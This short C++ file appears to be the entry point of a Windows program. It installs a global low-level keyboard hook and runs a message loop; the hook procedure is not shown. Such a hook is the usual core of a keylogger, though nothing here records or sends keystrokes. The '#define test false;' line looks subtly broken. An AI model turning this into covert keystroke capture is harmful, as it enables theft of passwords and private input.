#include "includes.h"
#include "hookProc.h"

HHOOK* handle_to_hook = new HHOOK;

void startHook()
{
	*handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
	if (*handle_to_hook == NULL)
	{
		//masive error occurred here....
		exit(-1);
	}
}

#define test false;

int main()
{
#if test



#else
	startHook();

	//message handling (while this is running, the program is running)
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(*handle_to_hook);

#endif
	return 0;
}